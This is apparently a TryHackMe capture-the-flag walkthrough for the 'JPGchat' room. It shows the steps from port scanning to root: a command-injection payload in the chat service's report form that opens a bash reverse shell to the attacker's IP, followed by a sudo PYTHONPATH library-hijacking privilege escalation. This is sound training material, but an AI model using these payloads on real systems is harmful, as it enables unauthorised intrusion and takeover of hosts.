# JPGchat

At: [TryHackme](https://tryhackme.com/room/jpgchat) By: [R4v3n](https://tryhackme.com/p/R4v3n)

## Enum

Time to start with an `nmap -sC -sV -vv -oN nmap.txt $IP` scan:
```
Nmap scan report for 10.10.61.192
Host is up, received reset ttl 63 (0.047s latency).
Scanned at 2021-02-28 16:19:04 EST for 9s
Not shown: 998 closed ports
Reason: 998 resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqRxJhw/1rrvXuEkXF+agfTYMZrCisS01Z9EWAv8j6Cxjd00jBeaTGD/OsyuWUGwIqC0duALIIccwQfG2DjyrJCIPYyXyRiTbTSbqe07wX6qnnxV4xBmKdu8SxVlPKqVN36gQtbHWQqk9M45sej0M3Qz2q5ucrQVgWsjxYflYI1GZg7DSuWbI9/GNJPugt96uxupK0pJiJXNG26sM+w0BdF/DHlWFxG0Z+2CMqSlNt4EA2hlgBWKzGxvKbznJsapdtrAvKxBF6WOfz/FdLMQa7f28UOSs2NnUDrpz8Xhdqz2fj8RiV+gnywm8rkIzT8FOcMTGfsvOHoR8lVFvp5mj
|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2CCqg8ac3eDsePDO27TM9OweWbaqytzrMyj+RbwDCHaAmfvhbA0CqTGdTIBAsVG6ect+OlqwgOvmTewS9ihB8=
|   256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIXcEOgRyLk02uwr8mYrmAmFsUGPSUw1MHEDeH5qmcxv
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Welcome to JPChat
|     source code of this service can be found at our admin's github
|     MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
|_    REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.91%I=7%D=2/28%Time=603C08CF%P=x86_64-pc-linux-gnu%r(NU
SF:LL,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20this\x20
SF:service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\nMESSAG
SF:E\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(currentl
SF:y\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x20to\x20
SF:report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n")%r(Gen
SF:ericLines,E2,"Welcome\x20to\x20JPChat\nthe\x20source\x20code\x20of\x20t
SF:his\x20service\x20can\x20be\x20found\x20at\x20our\x20admin's\x20github\
SF:nMESSAGE\x20USAGE:\x20use\x20\[MESSAGE\]\x20to\x20message\x20the\x20\(c
SF:urrently\)\x20only\x20channel\nREPORT\x20USAGE:\x20use\x20\[REPORT\]\x2
SF:0to\x20report\x20someone\x20to\x20the\x20admins\x20\(with\x20proof\)\n"
SF:);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Cool, we have ssh and supposedly a custom service? Lets try connect via netcat and run a second nmap in the background (on all ports).
</br>So here we connect to the chatting service:
```bash
$ nc $IP 3000
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
```

## OSINT

So we are supposed to look for the admin's github. Quickly jumping on GitHub and searching for `JPGchat` does the trick. [Here](https://github.com/Mozzie-jpg/JPChat).
```py
#!/usr/bin/env python3

import os

print ('Welcome to JPChat')
print ('the source code of this service can be found at our admin\'s github')

def report_form():

	print ('this report will be read by Mozzie-jpg')
	your_name = input('your name:\n')
	report_text = input('your report:\n')
	os.system("bash -c 'echo %s > /opt/jpchat/logs/report.txt'" % your_name)
	os.system("bash -c 'echo %s >> /opt/jpchat/logs/report.txt'" % report_text)

def chatting_service():

	print ('MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel')
	print ('REPORT USAGE: use [REPORT] to report someone to the admins (with proof)')
	message = input('')

	if message == '[REPORT]':
		report_form()
	if message == '[MESSAGE]':
		print ('There are currently 0 other users logged in')
		while True:
			message2 = input('[MESSAGE]: ')
			if message2 == '[REPORT]':
				report_form()

chatting_service()
```
Nice, as we can see the chat awaits either a `[MESSAGE]` or a `[REPORT]` and when using `[REPORT]` it puts our input into a `bash -c ''` context. This could be abused.
```bash
$ nc $IP 3000 
Welcome to JPChat
the source code of this service can be found at our admin's github
MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel
REPORT USAGE: use [REPORT] to report someone to the admins (with proof)
[REPORT]
this report will be read by Mozzie-jpg 								<-- Oh, this was a good hint :P 
your name:
```

## Foothold

So the exploit is as follows:
```
your name:
hi;bash -i >& /dev/tcp/10.8.147.71/8888 0>&1;
your report:
something
hi
```
By writing `hi;` we echo hi and end that command, then still in the context of `bash -c ''` we execute `bash -i >& /dev/tcp/YOUR_IP/8888 0>&1;` the last `;` si to ensure that the `>>` appending operation doesnt mess up our reverse shell. Listen with `nc -lvnp 8888` and get your rev shell!</br>

### Stabilize shell

```bash
python3 -c "import pt;pty.spawn('/bin/bash')"
export TERM=xterm
//CTRL + Z to background
stty raw -echo;fg             <-- after you finish type 'reset' to get your home terminal back
```
## Privesc

So who are we and what can we do?
```bash
wes@ubuntu-xenial:/$ id
uid=1001(wes) gid=1001(wes) groups=1001(wes)
wes@ubuntu-xenial:/$ sudo -l
Matching Defaults entries for wes on ubuntu-xenial:
    mail_badpass, env_keep+=PYTHONPATH

User wes may run the following commands on ubuntu-xenial:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /opt/development/test_module.py
```
Very nice, I see someone has a love for python!
```bash
wes@ubuntu-xenial:~$ cd /opt/development/
wes@ubuntu-xenial:/opt/development$ ls -l
total 4
-rw-r--r-- 1 root root 93 Jan 15 18:58 test_module.py
```
So we only have read, access. Time to check out the source.
```python
#!/usr/bin/env python3

from compare import *

print(compare.Str('hello', 'hello', 'hello'))
```
So import everything from compare and then run `compare.Str`? Aight, sadly we dont have write access in `/opt/development` oterhwise this would have been a module injcetion.
```bash
wes@ubuntu-xenial:/opt/development$ find / -type f 2>/dev/null | grep compare.py
/usr/lib/python3.5/compare.py
/usr/lib/python2.7/dist-packages/lxml/doctestcompare.pyc
/usr/lib/python2.7/dist-packages/lxml/doctestcompare.py
```	
But wait: `env_keep+=PYTHONPATH` maybe we can exploit this? We can! Consult [this](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8) article as I did!</br>
So I moved to `/dev/shm/` as that has lmost guaranteed write access and created the following `compare.py` script:
```python
class compare:

	def Str(self, x, y,):
		import os
		x = str(x)
		y = str(y)

		if x == y:
			os.system('/bin/bash -p')
			return True;
		else:
			return False;

	def Int(self, x, y,):
		x = int(x)
		y = int(y)

		if x == y:
			return True;
		else:
			return True;

	def Float(self, x, y,):
		x = float(x)
		y = float(y)

		if x == y:
			return True;
		else:
			return False;
```
Now run this command: `sudo PYTHONPATH=/dev/shm/ /usr/bin/python3 /opt/development/test_module.py`. Voila, root
```
FLAG REDACTED

Also huge shoutout to Westar for the OSINT idea
i wouldn't have used it if it wasnt for him.
and also thank you to Wes and Optional for all the help while developing

You can find some of their work here:
https://github.com/WesVleuten
https://github.com/optionalCTF
```
